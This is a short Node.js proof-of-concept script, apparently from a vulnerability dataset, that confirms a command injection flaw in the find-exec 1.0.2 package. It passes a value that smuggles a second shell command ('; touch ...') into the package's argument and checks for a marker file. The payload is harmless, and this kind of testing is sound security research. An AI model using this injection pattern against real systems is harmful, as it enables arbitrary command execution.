const fs = require("fs");

const target = require("../../explodejs-datasets/collected-dataset/CWE-78/find-exec-1.0.2/src");
const markerPath = "/tmp/probejs_report_skill_marker";
const payload = "; touch /tmp/probejs_report_skill_marker";

try {
  fs.unlinkSync(markerPath);
} catch {}

const result = target(payload);

if (!fs.existsSync(markerPath)) {
  throw new Error("marker file was not created");
}

fs.unlinkSync(markerPath);
console.log("PROBEJS_POC_SUCCESS", result);
